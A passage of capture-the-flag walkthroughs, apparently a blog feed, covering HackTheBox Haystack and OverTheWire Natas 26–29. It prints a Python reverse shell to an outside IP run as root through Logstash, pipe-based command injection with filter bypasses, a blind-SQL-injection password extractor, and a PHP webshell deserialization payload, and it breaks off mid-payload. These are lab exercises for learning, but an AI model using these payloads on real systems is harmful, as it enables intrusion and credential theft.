again.Set up the PTY for the shell once you are in (makes things a little easier)…I like to make the prompt better, but that’s just me…Also, while playing with the prompt I goofed on a command and saw something interesting…Lol, Spanish sure is key!Anyway, we can search for files we have access to with find / -group kibana .  You’ll notice that we have access to configuration files to something called “logstash” as well. Logstash is another piece of software from elasticsearch, but this one collects and processes input instead of output like kibana.There were a few files that seemed interesting:[kibana@haystack conf.d]$ lsfilter.conf input.conf output.conf[kibana@haystack conf.d]$ cat filter.conffilter { if [type] == &quot;execute&quot; { grok { match =&amp;amp;gt; { &quot;message&quot; =&amp;amp;gt; &quot;Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}&quot; } } }}[kibana@haystack conf.d]$ cat input.confinput { file { path =&amp;amp;gt; &quot;/opt/kibana/logstash_*&quot; start_position =&amp;amp;gt; &quot;beginning&quot; sincedb_path =&amp;amp;gt; &quot;/dev/null&quot; stat_interval =&amp;amp;gt; &quot;10 second&quot; type =&amp;amp;gt; &quot;execute&quot; mode =&amp;amp;gt; &quot;read&quot; }}[kibana@haystack conf.d]$ cat output.confoutput { if [type] == &quot;execute&quot; { stdout { codec =&amp;amp;gt; json } exec { command =&amp;amp;gt; &quot;%{comando} &amp;amp;&quot; } }}It looks like there could be command injection (type == “execute”) in the output.conf and filter.conf codes.I read some basic info pages on the config files and I believe how it works is as follows:Our data is defined by the input{} block and given certain attributes such as its type. The data is then processed by the filter{} block. Within the filter block, the grok{} routine uses a special parser called Grok to extract symbolic meaning out of the general text string, in this case “comando”. The results of the filter{} processing is piped to the output{} block for sending to the operating system through files, stdout, or in our case, shell execution.According to the stat_interval setting, the file input should be read every 10 seconds and executed if it grew in size. Discovering new files and checking whether they have grown/or shrunk occurs in a loop. This loop will sleep for stat_interval seconds before looping again. However, if files have grown, the new content is read and lines are enqueued. Reading and enqueuing across all grown files can take time, especially if the pipeline is congested. So the overall loop time is a combination of the stat_interval and the file read time.Creating a file “/opt/kibana/logstash_a” should fit the input{} block of the config file.Writing “Ejecutar comando: echo test” should fit the grok filter{} block. This can be tested with the Grok Debugger in the Web App we have access to now.Looking at the process list we can see the logstash process is running as root, so if we it can connect out to a reverse shell, we’ll get root![security@haystack tmp]$ ps -aux |grep logstashroot 6194 1.1 13.3 2738240 515912 ? SNsl 07:20 3:54 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstashkibana 17764 0.0 0.1 151424 5000 pts/5 S+ 10:31 0:00 vim logstash_1security 18412 0.0 0.0 112708 976 pts/0 R+ 13:04 0:00 grep --color=auto logstashThere’s multiple ways to do it, but creating a python script for the reverse shell and calling the script with the Grok command should work. My reverse shell script:#!/usr/bin/pythonimport socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.10.14.142&quot;,1338))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);And the Grok command to send:Ejecutar comando: /tmp/rshell.pyAnd it’ll take a little while for the logstash routine to run the payload, but it does eventually work!From there, just grab the root flag and this box is done!! " }, { "title": "OverTheWire: NATAS 29", "url": "/posts/overthewire-natas-29/", "categories": "Walkthrough, OverTheWire", "tags": "perl, web", "date": "2019-09-27 08:04:40 -0400", "snippet": "This level presents you with several articles from an old ezine about perl hacking.The page script “/index.pl” is what’s processing our selection. Here it is in Burp Suite:Objective 1 – sourcecodeI read some of the ezine issues and tried a few things to the input for “index.pl”. Eventually figured out that the trick is perl piping. The documentation says “Perl’s open function opens a pipe instead of a file when you append or prepend a pipe symbol to the second argument to open. This turns the rest of the arguments into a command, which will be interpreted as a process (or set of processes) that you want to pipe a stream of data either into or out of. “Given the insight that piping can lead to command injection, all we should have to do is add “|” to the beginning of the “file” variable and then we have total control! My first goal is to get the source for “index.pl” since the page doesn’t give us the link for it. ?file=|cat+index.pl should work. But that alone doesn’t get anything.The clue here is the “file” variable itself. The script is looking up a file, but there’s no extension on it, which could mean the extension is being forced. Null byte injection is how to solve that issue.Trying ?file=|cat+index.pl%00 works!Objective 2 – passwordOf course the first thing to try would be ?file=|cat+/etc/natas_webpass/natas30%00, but that doesn’t work! Surprise! We only get a “meeeeeep!” close to the end of the page.Looking in the source shows the culprit:if($f=~/natas/){ print &quot;meeeeeep!&amp;amp;lt;br&amp;amp;gt;&quot;;}It’s a simple word filter, and there are a few tricks to getting around those. Single Character Wildcard – The question mark is as wildcard for a single character in the Bash shell. Concatenated Strings – In Bash, there is something called string literal concatenation, meaning that adjacent string literals are concatenated, without any operator. An example would be &quot;Hello, &quot;&quot;World&quot; which has the value &quot;Hello, World&quot;.Some examples of strings to use for the “file” variable: |cat+/etc/na?as_webpass/na?as30%00 |cat+’/etc/na”tas_webpass/nat”as’30%00Using either of these will show the password at the bottom of the response HTML." }, { "title": "OverTheWire: NATAS 28", "url": "/posts/overthewire-natas-28/", "categories": "Walkthrough, OverTheWire", "tags": "web", "date": "2019-09-26 10:04:43 -0400", "snippet": "LEVEL 28No sourcecode, this will be fun. The program takes your query and searches it against a list of jokes, possibly in a database (since it says “whack computer joke database”).Checking out the requests in Burp shows that my test query “the” is sent to the server and the response returns our query encoded, likely base64. This encoded query is then used in a redirect to “/search.php”.It’s the “search.php” page that actually returns the results.The output of base64 decoding isn’t quite what I expected though, it looks random enough to be an encryption. Surely it’s either a homegrown encryption, or one that has known exploitable weaknesses.root@kali:~/otw/natas# echo &quot;G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKadzhfycqCxCf6AebHJxzOmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D&quot; | urldecode | base64 -d | xxd00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c ..%...[.W...Fm..00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2 ..r.....u....\\..00000020: 9a77 385f c9ca 82c4 27fa 01e6 c727 1cce .w8_....&#39;....&#39;..00000030: 9a2e 2b5d b6f3 1f19 a14f 7567 8ead aa90 ..+].....Oug....00000040: 4249 b93e 4dea 0909 4799 95b9 c44b 351a BI.&amp;amp;gt;M...G....K5.root@kali:~/otw/natas#Was thinking that maybe we don’t need to break the encryption to get some meaningful results. Since there’s the hint that we’re querying a database, we can give it SQL injection statements and see what returns. However, none of the attempts I made had any difference, even what should have worked for a totally blind injection. So the input is probably escaped the way it should be.CryptanalysisGiven the hint that it’s a database lookup, maybe the rest of the database query is in our input too. If the entire SQL query is being sent here, we won’t need an injection flaw, we would have complete control of the database after breaking the encryption.I don’t know much about formal cryptanalysis, but I do know one of the fundamental techniques used is something called a known plaintext attack. Where the analyst knows or controls part of the original text, or plaintext, and can make inferences based upon how the ciphertext changes. We know that the word “the” is in the plaintext. And if there’s an entire SQL query, we know the “SELECT” operator must be in there.To make analyzing so much easier, I made a bash script to help fetch the query strings instead of using Burp all the time and copying the data needed. It also uses another helper (python) script I wrote called “urldecode”, but it’s to find a solution for that.#!/bin/bash#Helper script with Natas28 challenge# Get the input as an argument or STDIN[ $# -ge 1 ] &amp;amp;&amp;amp; input=&quot;$1&quot; || read inputresp1=$(curl -i -X POST\\ http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.over&amp;amp;gt; -H &quot;User-Agent: curl&quot; \\ -d &quot;query=$input&quot;)query=$(echo &quot;$resp1&quot; | grep Location | awk -F&#39;query=&#39; &#39;{print $2}&#39;)echo &quot;$query&quot;query2=$(urldecode &quot;$query&quot; | base64 -d | xxd)echo &quot;$query2&quot;It just takes the first string given and returns the encoded query string and hex output. After trying different inputs with the helper script it becomes pretty clear there is a header in the response that never changes. The “SELECT” operator is probably within that unchanging header.Testing various lengths of successive input strings, adding a new character to the end each succession. Like “0123”, then “01234”. The ciphertext is in blocks of 16 bytes The first 2 blocks are unchanging The third block is different for successive inputs until it is 11 characters long The fourth block is different for successive inputs until it is 26 characters long The fifth block is different for successive inputs until it is 42 characters longThat output shows the encryption is in 16 byte blocks, and it is using Electronic Code Book mode. That should mean known plaintext attacks will be useful.Long repetitive input strings demonstrate the ECB mode predictability that we can exploit.root@kali:~/otw/natas# natas28 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 1055 100 944 100 111 414 48 0:00:02 0:00:02 --:--:-- 462G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJphx7FMRJp2Tgb25GgIYHAlErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVCUSubjGwYIb8CEwbSf3U1QlErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVAk6VfgG4VNzTDZVOyqkwhmoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3Dbase64: invalid input00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c ..%...[.W...Fm..00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2 ..r.....u....\\..00000020: 6987 1ec5 3112 69d9 381b db91 a021 81c0 i...1.i.8....!..00000030: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50 .J.....o......MP00000040: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50 .J.....o......MP00000050: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50 .J.....o......MP00000060: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50 .J.....o......MP00000070: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50 .J.....o......MP00000080: 24e9 57e0 1b85 4dcd 30d9 54ec aa93 0866 $.W...M.0.T....f00000090: a095 22f3 01cf 9d36 ac70 23f1 6594 8c5a ..&quot;....6.p#.e..Z000000a0: 9739 cd90 522f a7a8 6f95 773b 56f9 f8c0 .9..R/..o.w;V...Since the goal is to send our own crafted SQL statement that’s encrypted with this system, we don’t have to figure out the encryption itself, we can simply use it as an oracle that gives us exactly what we want…What that means is we send our SQL as the input string we want to encrypt in such a way that it is put into the output starting at offset 30h (0x00000030). Then extract those bytes and that’s the encrypted version of our SQL statement, and we can post it to “search.php”.From the earlier observations taken of input lengths, we can deduce that our target 0x30 block begins with the 11th input character. In other words, the first ten characters sent to the oracle don’t matter. But we need to make sure our input stays within our known window where the blocks are predictable, so we can cleanly extract what we want. One way to do that would be to fill in the remainder of the last block with dummy chars.Like this… suppose the input is “000000000011111111111111111111111111111111”, which is made by the command python -c “print(‘0’10 + ‘1’16*2)”. This gives us the first 10 useless chars as “0” and 32 payload chars as “1”, which results in 2 useful oracle blocks:root@kali:~# natas28 000000000011111111111111111111111111111111 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 992 100 944 100 48 410 20 0:00:02 0:00:02 --:--:-- 431G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK9k3v%2Boj9xyHjD7FjiGWNblErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVBzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3Dbase64: invalid input00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c ..%...[.W...Fm..00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2 ..r.....u....\\..00000020: bd93 7bfe a23f 71c8 78c3 ec58 e219 635b ..{..?q.x..X..c[00000030: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50 .J.....o......MP00000040: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50 .J.....o......MP00000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6 s._.JE.$gu.Z....00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702 .M.9.....fP...&#39;.Here’s a visualization of a SQL statement we could send and its relation to the oracle window (the “+” being a space in URL encoding):000000000011111111111111111111111111111111..........SELECT+*+FROM+jokes+++++++++++++This is what we have back:root@kali:~/otw/natas# echo &quot;..........SELECT * FROM jokes &quot; | urlencode | natas28Sending: ..........SELECT%20%2A%20FROM%20jokes%20%20%20%20%20%20%20%20%20%20%20%20%20 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 1026 100 944 100 82 412 35 0:00:02 0:00:02 --:--:-- 448G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKOGw9HPNy3SNDiT1Atyyb%2B6vUN12jxQYxd3lxf09PAjHs53rpC0ckH975k1JsPIfZzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3Dbase64: invalid input00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c ..%...[.W...Fm..00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2 ..r.....u....\\..00000020: 8e1b 0f47 3cdc b748 d0e2 4f50 2dcb 26fe ...G&amp;amp;lt;..H..OP-.&amp;amp;.00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c ....h.A.].\\_....00000040: 7b39 deba 42d1 c907 f7be 64d4 9b0f 21f6 {9..B.....d...!.00000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6 s._.JE.$gu.Z....00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702 .M.9.....fP...&#39;.And our oracle window:00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c ....h.A.].\\_....00000040: 7b39 deba 42d1 c907 f7be 64d4 9b0f 21f6 {9..B.....d...!.The final result is a bytestring of “de5b990ac1d04c6547da89610dc8680f39a7ae9df9901b5e334a484231dc3482”. To use this, it must be encoded back into a base64 string to send to “/search.php”. Use echo “eaf50dd768f1418c5dde5c5fd3d3c08c7b39deba42d1c907f7be64d49b0f21f6” | xxd -r -p | base64However, when trying to send the new query, it gives an error, “Incorrect amount of PKCS#7 padding for blocksize”.Let’s see. PKCS #7 is described in RFC 5652 (Cryptographic Message Syntax).The padding scheme itself is given in section 6.3. Content-encryption Process. It essentially says: append that many bytes as needed to fill the given block size (but at least one), and each of them should have the padding length as value.Thus, looking at the last decrypted byte we know how many bytes to strip off. (One could also check that they all have the same value.)This basically means we are sending the wrong length, since we don’t want any cryptographic padding.To fix this, we need to send the last part of the original encrypted query instead of just the middle window part. To make it work with the SQL we want to execute, add a comment character on the end to ignore whatever else may be in the encrypted part.The corrected data should look like this:root@kali:~/otw/natas# python -c &quot;print(&#39;.&#39;*10 + &#39;SELECT * FROM jokes #&#39; + &#39; &#39;*11)&quot; | urlencode | natas28Sending: ..........SELECT%20%2A%20FROM%20jokes%20%23%20%20%20%20%20%20%20%20%20%20%20 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 1026 100 944 100 82 412 35 0:00:02 0:00:02 --:--:-- 447G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKOGw9HPNy3SNDiT1Atyyb%2B6vUN12jxQYxd3lxf09PAjAmOGYfT%2FZBosXI1SRye%2FjRzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3Dbase64: invalid input00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c ..%...[.W...Fm..00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2 ..r.....u....\\..00000020: 8e1b 0f47 3cdc b748 d0e2 4f50 2dcb 26fe ...G&amp;amp;lt;..H..OP-.&amp;amp;.00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c ....h.A.].\\_....00000040: 098e 1987 d3fd 9068 b172 3549 1c9e fe34 .......h.r5I...400000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6 s._.JE.$gu.Z....00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702 .M.9.....fP...&#39;.root@kali:~/otw/natas# echo &quot;eaf50dd768f1418c5dde5c5fd3d3c08c098e1987d3fd9068b17235491c9efe34738a5ffb4a4500246775175ae596bbd6f34df339c69edce11f6650bbced62702&quot; | xxd -r -p | base646vUN12jxQYxd3lxf09PAjAmOGYfT/ZBosXI1SRye/jRzil/7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg==And the result in Burp:Awesome! We have jokes!SQLNow that we can query the joke database with our own SQL code, the next objective is to extract the password for natas29.To help with this objective, I modified the helper script to be more helpful:#!/bin/bash#Helper script with Natas28 challenge# Get the input as an argument or STDIN[ $# -ge 1 ] &amp;amp;&amp;amp; input=&quot;$1&quot; || read inputstrlength=`printf &quot;%s&quot; &quot;$input&quot; | wc -c` remainder=$(( 16 - $strlength % 16 )) payload=$(printf &quot;%0.s &quot; {1..10}) payload+=&quot;$input&quot;payload+=$(printf &quot;%0.s &quot; $(seq $remainder))payload2=$(urlencode &quot;$payload&quot;)echo &quot;Sending: $payload2&quot;resp1=$(curl -i \\ http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/index.php \\ -H &quot;User-Agent: curl&quot; \\ -d &quot;query=$payload2&quot;)query=$(echo &quot;$resp1&quot; | grep Location | awk -F&#39;query=&#39; &#39;{print $2}&#39;)echo &quot;$query&quot;# URLdecode, base64 decode, print result from position 49 skipping the header, encode back into base64 query2=$(urldecode &quot;$query&quot; | base64 -d | tail -c +49 | base64 -w0) echo &quot;Encrypted Query: $query2&quot;output=$(curl -i \\ http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/search.php \\ -H &quot;User-Agent: curl&quot; \\ -d &quot;query=$query2&quot; )echo &quot;Result: $output&quot;The script takes the SQL query we want and returns the output from “search.php”. No intermediary steps needed =).I then experimented with SQL commands to figure out a way to extract the password, and settled on using ‘select * from jokes where ascii(substring((select password from users) from %d for 1))=%d #’ % (i, ord(c))in a loop. That will test each character one at a time and if we guess it right, then jokes will be sent back in the response, otherwise no joke.There’s just no way you’re going to want to do this manually, so here’s my python script for it:#!/usr/bin/python3.7## main execution script for solving natas28 on OverTheWire.orgimport binasciiimport urllib as ulimport requestsimport time# All possible charactersallChars = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;# Final Passwordpassword = &#39;&#39;# Our target URLtarget = &quot;http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org&quot;headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101&#39;,}def urlencode(data): return ul.parse.quote_plus(data)def urldecode(data): return ul.parse.unquote_plus(data)def send_query(query): blocksize = 16 remainder = len(query) % blocksize # format query string with correct amount of characters f_query = &#39;.&#39; * 10 + str(query) + &#39; &#39; * (blocksize - remainder) # print query for reference print(&#39;{&#39; + f_query + &#39;}&#39;) # send query to site for encryption payload = {&#39;query&#39;: f_query} r = requests.post(target + &#39;/index.php&#39;, data=payload, headers=headers, allow_redirects=False) # print(r.headers) # format the response to only keep our modified query mod_r = urldecode(r.headers[&#39;Location&#39;]) mod_r = mod_r.split(&#39;query=&#39;) bin_data = binascii.a2b_base64(mod_r[1] + &#39;===&#39;) bin_data = binascii.hexlify(bin_data) bin_data = bin_data[96:] bin_data = binascii.unhexlify(bin_data) bin_data = binascii.b2a_base64(bin_data, newline=False) print(&quot;Binary Data String: &quot; + str(bin_data, &#39;utf-8&#39;)) # send the modified query to the search site payload = {&#39;query&#39;: bin_data} response = requests.get(target + &#39;/search.php?&#39;, params=payload, headers=headers, allow_redirects=False) print(response.text) return response# Checking if we can connect to the target, just in case...r = requests.get(target, headers=headers)if r.status_code != requests.codes.ok: raise ValueError(&#39;Couldn\\&#39;t connect to target :(&#39;)else: print(&#39;Target reachable. Starting character parsing...&#39;)# Password is 32 characters longstart_time = time.time()for i in range(1,33): for c in allChars: print(&quot;Trying Character: &quot; + c) print(&quot;Password so far: &quot; + password) resp = send_query(&#39;select * from jokes where ascii(substring((select password from users) from %d for 1))=%d #&#39; % (i, ord(c))) if &#39;Halloween&#39; in resp.text: password += c breakprint(&#39;Password: &#39; + password)print(&quot;--- %s seconds ---&quot; % (time.time() - start_time))It took a while on my VM though:" }, { "title": "OverTheWire: NATAS 26 &amp;#8211; 27", "url": "/posts/overthewire-natas-26/", "categories": "Walkthrough, OverTheWire", "tags": "web", "date": "2019-09-19 14:40:12 -0400", "snippet": "LEVEL 26The sourcecode:&amp;lt;?php // sry, this is ugly as hell. // cheers kaliman ;) // - morla class Logger{ private $logFile; private $initMsg; private $exitMsg; function __construct($file){ // initialise variables $this-&amp;gt;initMsg=&quot;#--session started--#\\n&quot;; $this-&amp;gt;exitMsg=&quot;#--session end--#\\n&quot;; $this-&amp;gt;logFile = &quot;/tmp/natas26_&quot; . $file . &quot;.log&quot;; // write initial message $fd=fopen($this-&amp;gt;logFile,&quot;a+&quot;); fwrite($fd,$initMsg); fclose($fd); } function log($msg){ $fd=fopen($this-&amp;gt;logFile,&quot;a+&quot;); fwrite($fd,$msg.&quot;\\n&quot;); fclose($fd); } function __destruct(){ // write exit message $fd=fopen($this-&amp;gt;logFile,&quot;a+&quot;); fwrite($fd,$this-&amp;gt;exitMsg); fclose($fd); } } function showImage($filename){ if(file_exists($filename)) echo &quot;&amp;lt;img src=\\&quot;$filename\\&quot;&amp;gt;&quot;; } function drawImage($filename){ $img=imagecreatetruecolor(400,300); drawFromUserdata($img); imagepng($img,$filename); imagedestroy($img); } function drawFromUserdata($img){ if( array_key_exists(&quot;x1&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;x2&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;y2&quot;, $_GET)){ $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$_GET[&quot;x1&quot;], $_GET[&quot;y1&quot;], $_GET[&quot;x2&quot;], $_GET[&quot;y2&quot;], $color); } if (array_key_exists(&quot;drawing&quot;, $_COOKIE)){ $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;])); if($drawing) foreach($drawing as $object) if( array_key_exists(&quot;x1&quot;, $object) &amp;amp;&amp;amp; array_key_exists(&quot;y1&quot;, $object) &amp;amp;&amp;amp; array_key_exists(&quot;x2&quot;, $object) &amp;amp;&amp;amp; array_key_exists(&quot;y2&quot;, $object)){ $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$object[&quot;x1&quot;],$object[&quot;y1&quot;], $object[&quot;x2&quot;] ,$object[&quot;y2&quot;] ,$color); } } } function storeData(){ $new_object=array(); if(array_key_exists(&quot;x1&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;x2&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;y2&quot;, $_GET)){ $new_object[&quot;x1&quot;]=$_GET[&quot;x1&quot;]; $new_object[&quot;y1&quot;]=$_GET[&quot;y1&quot;]; $new_object[&quot;x2&quot;]=$_GET[&quot;x2&quot;]; $new_object[&quot;y2&quot;]=$_GET[&quot;y2&quot;]; } if (array_key_exists(&quot;drawing&quot;, $_COOKIE)){ $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;])); } else{ // create new array $drawing=array(); } $drawing[]=$new_object; setcookie(&quot;drawing&quot;,base64_encode(serialize($drawing))); }?&amp;gt;&amp;lt;h1&amp;gt;natas26&amp;lt;/h1&amp;gt;&amp;lt;div id=&quot;content&quot;&amp;gt;Draw a line:&amp;lt;br&amp;gt;&amp;lt;form name=&quot;input&quot; method=&quot;get&quot;&amp;gt;X1&amp;lt;input type=&quot;text&quot; name=&quot;x1&quot; size=2&amp;gt;Y1&amp;lt;input type=&quot;text&quot; name=&quot;y1&quot; size=2&amp;gt;X2&amp;lt;input type=&quot;text&quot; name=&quot;x2&quot; size=2&amp;gt;Y2&amp;lt;input type=&quot;text&quot; name=&quot;y2&quot; size=2&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;DRAW!&quot;&amp;gt;&amp;lt;/form&amp;gt; &amp;lt;?php session_start(); if (array_key_exists(&quot;drawing&quot;, $_COOKIE) || ( array_key_exists(&quot;x1&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;x2&quot;, $_GET) &amp;amp;&amp;amp; array_key_exists(&quot;y2&quot;, $_GET))){ $imgfile=&quot;img/natas26_&quot; . session_id() .&quot;.png&quot;; drawImage($imgfile); showImage($imgfile); storeData(); } ?&amp;gt;Whew! So much code… the levels are getting real good now!From reviewing the code, it looks like the vulnerability is PHP OBJECT INJECTION via the unserialize() call. According to OWASP on the nature of this vulnerability, we should be able to use the unserialize() call to overwrite ‘Logger =&amp;gt; exitMsg’. When the page calls Logger.__destruct() method, our modified exitMsg will be saved into the log file. We should then be able to open the log file and get a stored XSS to read out the password.We need to know the structure of serialized data pretty well to make our own. Once base64 decoded, an example of serialized data from this page is:a:1:{ i:0;a:4:{ s:2:&quot;x1&quot;; s:1:&quot;1&quot;; s:2:&quot;y1&quot;; s:1:&quot;2&quot;; s:2:&quot;x2&quot;; s:1:&quot;3&quot;; s:2:&quot;y2&quot;; s:1:&quot;4&quot;; }}Since we actually can control the ‘$logFile’ variable as well as ‘$exitMsg’, we can change the log file into a php file, and make a webshell for executing commands!An example of serialized data for a request that manipulates both variables:a:1:{ i:0; O:6:&quot;Logger&quot;:2:{ s:15:&quot;\\0Logger\\0logFile&quot;; s:31:&quot;img/natas26_ponderngnatas26.php&quot;; s:15:&quot;\\0Logger\\0exitMsg&quot;; s:21:&quot;&amp;lt;pre&amp;gt; &amp;lt;?=`$_GET[1]`?&amp;gt;&quot;; }}Here the structure I need to explain is the “O”, which means the Object type. Objects are serialized as: O:&amp;lt;i&amp;gt;:&quot;&amp;lt;s&amp;gt;&quot;:&amp;lt;i&amp;gt;:{&amp;lt;properties&amp;gt;} where the first &amp;lt;i&amp;gt; is an integer representing the string length of &amp;lt;s&amp;gt;, and &amp;lt;s&amp;gt; is the fully qualified class name (class name prepended with full namespace). The second &amp;lt;i&amp;gt; is an integer representing the number of object properties. &amp;lt;properties&amp;gt; are zero or more serialized name value pairs: &amp;lt;/span&amp;gt; where &amp;lt;name&amp;gt; is a serialized string representing the property name, and &amp;lt;value&amp;gt; any value that is serializable.Our first pair iss:15:&quot;\\0Logger\\0logFile&quot;;s:31:&quot;img/natas26_randomname.php&quot;;and second pair iss:15:&quot;\\0Logger\\0exitMsg&quot;;s:21:&quot;&amp;lt;pre&amp;gt; 